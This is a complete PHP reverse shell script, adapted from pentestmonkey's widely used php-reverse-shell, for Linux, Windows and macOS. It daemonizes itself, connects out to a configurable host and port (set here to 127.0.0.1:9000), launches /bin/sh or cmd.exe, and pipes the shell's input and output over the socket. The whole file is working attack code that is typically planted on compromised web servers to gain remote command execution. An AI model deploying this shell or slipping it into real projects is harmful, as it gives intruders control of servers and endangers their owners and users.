<?php
// Copyright (c) 2020 Ivan Šincek
// v1.0
// Requires PHP v4.3.0 or greater.
// Works on Linux OS, Windows OS and macOS.
// See the original script at https://github.com/pentestmonkey/php-reverse-shell.
header('Content-Type: text/plain; charset=UTF-8');
class Shell {
    var $ip    = null;
    var $port  = null;
    var $os    = null;
    var $shell = null;
    var $descriptorspec = array(
        0 => array('pipe', 'r'), // shell can read from STDIN
        1 => array('pipe', 'w'), // shell can write to STDOUT
        2 => array('pipe', 'w')  // shell can write to STDERR
    );
    var $options = array(); // proc_open() options
    var $buffer  = 1024;    // read/write buffer size
    var $clen    = 0;       // command length
    var $error   = false;   // stream read/write error
    function Shell($ip, $port) {
        $this->ip   = $ip;
        $this->port = $port;
        if (strpos(strtoupper(PHP_OS), 'LINUX') !== false) { // same for macOS
            $this->os    = 'LINUX';
            $this->shell = '/bin/sh';
        } else if (strpos(strtoupper(PHP_OS), 'WIN32') !== false || strpos(strtoupper(PHP_OS), 'WINNT') !== false || strpos(strtoupper(PHP_OS), 'WINDOWS') !== false) {
            $this->os    = 'WINDOWS';
            $this->shell = 'cmd.exe';
            $this->options['bypass_shell'] = true; // we do not want a shell within a shell
        } else {
            echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\n";
            exit(0);
        }
    }
    function daemonize() {
        set_time_limit(0); // do not impose the script execution time limit
        if (!function_exists('pcntl_fork')) {
            echo "DAEMONIZE: pcntl_fork() does not exists, moving on...\n";
        } else {
            if (($pid = pcntl_fork()) < 0) {
                echo "DAEMONIZE: Cannot fork off the parent process, moving on...\n";
            } else if ($pid > 0) {
                echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\n";
                exit(0);
            } else if (posix_setsid() < 0) { // once daemonized you will no longer see the script's dump
                echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\n";
            } else {
                echo "DAEMONIZE: Completed successfully!\n";
            }
        }
        umask(0); // set the file/directory permissions - 666 for files and 777 for directories
    }
    function read($stream, $name, $buffer) {
        if (($data = @fread($stream, $buffer)) === false) { // suppress an error when reading from a closed blocking stream
            $this->error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot read from ${name}, script will now exit...\n";
        }
        return $data;
    }
    function write($stream, $name, $data) {
        if (($bytes = @fwrite($stream, $data)) === false) { // suppress an error when writing to a closed blocking stream
            $this->error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot write to ${name}, script will now exit...\n";
        }
        return $bytes;
    }
    // read/write method for non-blocking streams
    function rw($input, $output, $iname, $oname) {
        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {
            echo $data; // script's dump
            if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); } // calculate the command length
        }
    }
    // read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)
    // we must read the exact byte length from a stream and not a single byte more
    function brw($input, $output, $iname, $oname) {
        $size = fstat($input)['size'];
        if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {
            $this->offset($input, $iname, $this->clen); // for some reason Windows OS pipes STDIN into STDOUT
            $size -= $this->clen;                       // we do not like that
            $this->clen = 0;
        }
        $fragments = ceil($size / $this->buffer); // number of fragments to read
        $remainder = $size % $this->buffer;       // size of the last fragment if it is less than the buffer size
        while ($fragments && ($data = $this->read($input, $iname, $remainder && $fragments-- == 1 ? $remainder : $this->buffer)) && $this->write($output, $oname, $data)) {
            echo $data; // script's dump
        }
    }
    function offset($stream, $name, $offset) {
        while ($offset > 0 && $this->read($stream, $name, $offset >= $this->buffer ? $this->buffer : $offset)) { // discard the data from a stream
            $offset -= $this->buffer;
        }
        return $offset > 0 ? false : true;
    }
    function run() {
        $this->daemonize();

        // ----- SOCKET BEGIN -----
        $socket = @fsockopen($this->ip, $this->port, $errno, $errstr, 30);
        if (!$socket) {
            echo "SOC_ERROR: {$errno}: {$errstr}\n";
        } else {
            stream_set_blocking($socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS

            // ----- SHELL BEGIN -----
            $process = proc_open($this->shell, $this->descriptorspec, $pipes, '/', null, $this->options);
            if (!$process) {
                echo "PROC_ERROR: Cannot start the shell\n";
            } else {
                foreach ($pipes as $pipe) {
                    stream_set_blocking($pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS
                }

                // ----- WORK BEGIN -----
                fwrite($socket, "SOCKET: Shell has connected!\n");
                while (!$this->error) {
                    if (feof($socket)) { // check for end-of-file on SOCKET
                        echo "SOC_ERROR: Shell connection has been terminated\n"; break;
                    } else if (feof($pipes[1])) {                                        // check for end-of-file on STDOUT
                        echo "PROC_ERROR: Shell process has been terminated\n";   break; // feof() does not work with blocking streams
                    }                                                                    // the only way to exit on Windows OS is by terminating the socket connection (e.g. CTRL + C)
                    $streams = array(
                        'read'   => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR
                        'write'  => null,
                        'except' => null
                    );
                    $num_changed_streams = stream_select($streams['read'], $streams['write'], $streams['except'], null); // wait for stream changes | will not wait on Windows OS
                    if ($num_changed_streams === false) {
                        echo "STRM_ERROR: stream_select() failed\n"; break;
                    } else if ($num_changed_streams > 0) {
                        if ($this->os === 'LINUX') {
                            if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                            if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                            if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                        } else if ($this->os === 'WINDOWS') {
                            // order is important
                            if (in_array($socket, $streams['read'])) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                            if (fstat($pipes[2])['size']/*-------*/) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                            if (fstat($pipes[1])['size']/*-------*/) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                        }
                    }
                }
                // ------ WORK END ------

                foreach ($pipes as $pipe) {
                    fclose($pipe);
                }
                proc_close($process);
            }
            // ------ SHELL END ------

            fclose($socket);
        }
        // ------ SOCKET END ------

    }
}
// change the host address and/or port number as necessary
$reverse_shell = new Shell('127.0.0.1', 9000);
$reverse_shell->Run();
?>
